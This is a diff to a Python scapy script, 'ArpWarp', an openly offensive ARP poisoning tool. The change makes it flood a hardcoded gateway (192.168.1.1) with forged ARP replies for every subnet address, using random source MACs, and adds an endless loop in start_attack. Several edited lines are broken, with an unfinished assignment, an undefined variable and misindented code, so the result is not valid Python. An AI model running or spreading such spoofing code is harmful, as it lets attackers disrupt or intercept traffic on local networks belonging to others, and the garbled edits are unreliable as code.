@@ -1,5 +1,6 @@
 import argparse
 import logging
+import ipaddress
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
 from scapy.all import *
@@ -26,12 +27,15 @@ banner = """
 ../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
 """
 
+# TODO ipv4 only supported?
+# todo mac for gateway
 
 class ArpWarp:
     _P_TIMEOUT = 2
-    _DEF_CIDR = 24 # todo argparse
 
-    def __init__(self, iface, cidr, s_time):
+    def __init__(self, iface, cidr, s_time, gateway=None):
+        print(f"[*] Setting up attacker...")
+
         self.network_interface = iface
         self.cidr = cidr
 
@@ -41,23 +45,29 @@ class ArpWarp:
         self.arp_poison_interval = s_time
 
         self.subnet = self.my_private_ip.split(".")[:3]
+        self.gateway = gateway or f"{'.'.join(self.subnet)}.1"
 
-        self.original_arp_cache = self.generate_original_cache()
-        if len(self.original_arp_cache) <= 1:
-            raise Exception(f"Not enough hosts -> {len(self.original_arp_cache)}")
-        self.poisoned_arp_cache = self.generate_poisoned_cache()
+        self.host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
+                         host_ip != self.my_private_ip and host_ip != self.gateway}
+        print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
 
         self.abort = False
 
     def generate_original_cache(self) -> Dict[str, str]:
-        arp_cache = dict()
-        print(f"[*] Generating original ARP cache for subnet {'.'.join(self.subnet)}.x, this might a minute...")
-
+        gateway = self.subnet
+        host_ips =
+        while True:
+            for host_ip in host_ips:
+                arp_packet = ARP(op=2, psrc=ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
+                sendp(Ether() / arp_packet, iface=self.network_interface)
+                print(host_ip)
+            time.sleep(self.arp_poison_interval)
+        exit(0)
         subnet = ".".join(self.subnet + ["0"])
         arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
         broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
-        answered_list = srp(arp_request_broadcast, timeout=2)[0]
+        answered_list = srp(arp_request_broadcast, timeout=2, iface=self.network_interface)[0]
 
         for _ in range(3):  # perform several scans
             for element in answered_list:
@@ -91,16 +101,9 @@ class ArpWarp:
         iterate over all spoofed entries, and send each host (inside an inner loop) the
         arp packets of the scrambled entries
         """
-        for poison_host_ip, poison_host_mac in self.poisoned_arp_cache.items():
-            print(f"[*] Poisoning for {poison_host_ip}...")
-            for target_host_ip, target_host_mac in self.original_arp_cache.items():
-                if target_host_ip != poison_host_ip:
-                    self.send_arp_packet(iface=self.network_interface,
-                                         op=2,
-                                         psrc=poison_host_ip,
-                                         hwsrc=poison_host_mac,
-                                         pdst=target_host_ip,
-                                         hwdst=target_host_mac)
+        for host_ip in self.host_ips:  # TODO get mac of gateway
+            arp_packet = ARP(op=2, psrc=host_ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
+            sendp(Ether() / arp_packet, iface=self.network_interface)
 
     def restore_arp(self):
         """
@@ -119,6 +122,15 @@ class ArpWarp:
                                          hwdst=target_host_mac)
 
     def start_attack(self):
+        print(f"[*] Generating original ARP cache for subnet {'.'.join(self.subnet)}.x, this might a minute...")
+        gateway = self.subnet
+        host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
+                    host_ip != self.my_private_ip and host_ip != self.gateway}
+        while True:
+
+                print(host_ip)
+            time.sleep(self.arp_poison_interval)
+
         loop_count = 0
         while not self.abort:
             try:
@@ -161,7 +173,6 @@ if __name__ == "__main__":
                         required=False)
     arguments = parser.parse_args()
 
-    print(f"[*] Setting up attacker...")
     warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time)
     warper.start_attack()
 
